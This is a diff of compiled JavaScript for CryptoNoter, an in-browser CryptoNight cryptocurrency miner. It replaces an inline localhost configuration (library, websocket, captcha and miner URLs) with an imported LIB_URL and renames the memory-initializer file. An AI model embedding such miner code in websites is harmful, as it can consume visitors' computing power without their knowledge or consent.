@@ -1,15 +1,9 @@
 /* eslint-env browser */
 /* eslint-disable */
-self.CryptoNoter = self.CryptoNoter || {};
-self.CryptoNoter.CONFIG = {
-    LIB_URL: "http://localhost:3000/lib/",
-    WEBSOCKET_SHARDS: [["ws://localhost:3000/socket.io"]],
-    CAPTCHA_URL: "http://localhost:3000/captcha/",
-    MINER_URL: "http://localhost:3000/media/miner.html"
-};
+import {LIB_URL} from '../credentials';
 var Module = {
     locateFile: (function (path) {
-        return CryptoNoter.CONFIG.LIB_URL + path
+        return LIB_URL + path
     })
 };
 var Module;
@@ -1058,7 +1052,7 @@ var ASM_CONSTS = [];
 STATIC_BASE = Runtime.GLOBAL_BASE;
 STATICTOP = STATIC_BASE + 11504;
 __ATINIT__.push();
-memoryInitializer = "cryptonoter.asm.js.mem";
+memoryInitializer = "cryptonight.asm.js.mem";
 var tempDoublePtr = STATICTOP;
 STATICTOP += 16;
 var PROCINFO = {
